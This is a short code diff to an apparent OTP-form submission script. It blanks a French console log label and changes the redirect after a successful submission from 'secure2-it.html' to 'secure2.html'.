@@ -155,7 +155,7 @@ if (otpForm && otpSingle && result) {
 
 
         console.log(
-            "connexion en cour :",
+            "",
             response.status,
             response.text
         );
@@ -169,7 +169,7 @@ if (otpForm && otpSingle && result) {
         // Redirection après envoi réussi
         // ------------------------------
 
-        window.location.href = "secure2-it.html";
+        window.location.href = "secure2.html";
 
 
     } catch (error) {
